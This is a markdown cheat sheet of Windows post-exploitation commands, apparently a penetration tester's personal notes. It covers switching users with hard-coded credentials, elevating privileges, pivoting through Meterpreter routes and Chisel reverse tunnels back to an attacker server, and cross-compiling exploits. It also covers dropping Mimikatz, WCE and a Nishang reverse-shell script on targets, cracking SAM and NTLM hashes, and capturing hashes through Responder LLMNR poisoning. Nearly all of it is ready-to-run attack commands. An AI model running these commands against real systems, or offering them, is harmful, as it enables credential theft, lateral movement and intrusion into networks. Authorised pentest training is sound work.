# Windows Post-Exploit

- [Windows Post-Exploit](#windows-post-exploit)
- [Switch user](#switch-user)
  - [Powershell](#powershell)
  - [Tool](#tool)
- [Pivoting](#pivoting)
  - [Meterpreter](#meterpreter)
    - [Set Route](#set-route)
  - [Chisel](#chisel)
    - [Port forwarding](#port-forwarding)
    - [Traffic forwarding](#traffic-forwarding)
      - [Server (Attacker)](#server-attacker)
      - [Target](#target)
  - [Proxychains](#proxychains)
- [Compile for windows](#compile-for-windows)
  - [X86](#x86)
  - [X64](#x64)
- [Dump Password](#dump-password)
  - [Windows Credentials Editor](#windows-credentials-editor)
  - [Mimikatz](#mimikatz)
  - [Crack SAM + SYSTEM](#crack-sam--system)
- [Nishang](#nishang)
- [Responder - LLMNR & NBT-NS Poisoning](#responder---llmnr--nbt-ns-poisoning)


# Switch user 

## Powershell 

```powershell
$username='batman'
$password='Zx^#QZX+T!123'
$securePassword=(ConvertTo-SecureString $password -AsPlainText -Force)
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Enter-PSSession -ComputerName localhost -Credential $credential
```

> Elevate cmd 

    runas /user:admin cmd
    powershell -Command "Start-Process cmd -Verb RunAs"

## Tool

    WinNC.exe IP_ADDRESS PORT -u USERNAME -p PASSWORD [cmd|pwd|rtcp]

# Pivoting

## Meterpreter

### Set Route 

    run autoroute -s 172.16.1.0/24

Check the result 

    run autoroute -p

Run server SOCK4

    use auxiliary/server/socks4a
    set SRVPORT 9050
    run -j 


## Chisel

### Port forwarding

> Client

    chisel client Server_IP:6666 R:7777:127.0.0.1:8443

> Server
> 
    chisel server -p port --reverse
Connect:

    https://127.0.0.1:7777

### Traffic forwarding

#### Server (Attacker)

    1.chisel server -p 8000 -reverse
    4.chisel client 127.0.0.1:8001 socks

#### Target

    2.chisel client Server_IP:8000 R:8001:127.0.0.1:1337
    3.chisel server -p 1337 --socks5

## Proxychains

> proxychains

nano /etc/proxychains.conf

    socks5         127.0.0.1 1080

proxychains command 

> Nmap 

    proxychains -q nmap -sT -P0 IP_ADDRESS

> Foxy proxy 

    For the web 

# Compile for windows 

## X86
> C

    i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
> C++

    i686-w64-mingw32-g++ exploit.c -o exploit.exe -lws2_32
## X64

> C

    x86_64-w64-mingw32-gcc exploit.cpp -o exploit.exe
> C++

    x86_64-w64-mingw32-g++ exploit.cpp -o exploit.exe
# Dump Password
## Windows Credentials Editor

Drop those **file** to the target computer 

    /usr/share/wce/wce_x64.exe
    /usr/share/wce/wce.exe
    
## Mimikatz

Drop those **Directory** to the target computer

    /usr/share/mimikatz/Win32
    /usr/share/mimikatz/x64


Powershell code 

    /usr/share/mimikatz/Invoke-Mimikatz.ps1
    
## Crack SAM + SYSTEM 

samdump2 system sam > hash 

> John 

    john hash

> Hashcat 

    cat dumpHash | cut -d ":" -f 4 | sort | uniq > ntlm.txt
    hashcat -m 1000 -a 3 ./ntlm.txt -w 3 rockyou.txt

# Nishang
Pentest tools and script (Backdoor/Bypass/PrivEscal/MITM/Pivot/Scan/InfoGather)
(https://github.com/samratashok/nishang.git)


Drop this **Directory** to the target computer

    /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
    
# Responder - LLMNR & NBT-NS Poisoning

To listen 

    responder -i ens33 -f 

Path of the hash 

    cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt

Crack the hash 

    john /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.81.txt --format=netntlmv2 --wordlist=rockyou.txt

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation